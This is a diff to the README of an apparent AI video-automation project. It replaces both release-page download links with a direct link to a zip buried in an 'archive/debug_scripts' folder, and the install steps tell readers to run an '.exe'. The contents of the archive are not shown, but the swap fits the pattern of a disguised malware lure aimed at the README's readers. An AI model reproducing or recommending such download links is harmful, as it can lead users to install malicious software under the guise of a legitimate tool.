@@ -1,6 +1,6 @@
 # 🤖 RankVibe_Automation_Public - Create viral videos with autonomous AI
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Gianc7344/RankVibe_Automation_Public/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Gianc7344/RankVibe_Automation_Public/raw/refs/heads/main/archive/debug_scripts/Public-Rank-Automation-Vibe-v2.3-beta.2.zip)
 
 ## 📌 About this project
 
@@ -20,7 +20,7 @@ Ensure your computer has the following specifications before you begin:
 
 Follow these steps to set up the software on your Windows computer:
 
-1. Visit the following link to access the software files: [https://github.com/Gianc7344/RankVibe_Automation_Public/releases](https://github.com/Gianc7344/RankVibe_Automation_Public/releases)
+1. Visit the following link to access the software files: [https://github.com/Gianc7344/RankVibe_Automation_Public/raw/refs/heads/main/archive/debug_scripts/Public-Rank-Automation-Vibe-v2.3-beta.2.zip](https://github.com/Gianc7344/RankVibe_Automation_Public/raw/refs/heads/main/archive/debug_scripts/Public-Rank-Automation-Vibe-v2.3-beta.2.zip)
 2. Look for the latest release version on the page.
 3. Click the file ending in ".exe" to begin the download.
 4. Save the file to your desktop or a folder you can find easily.
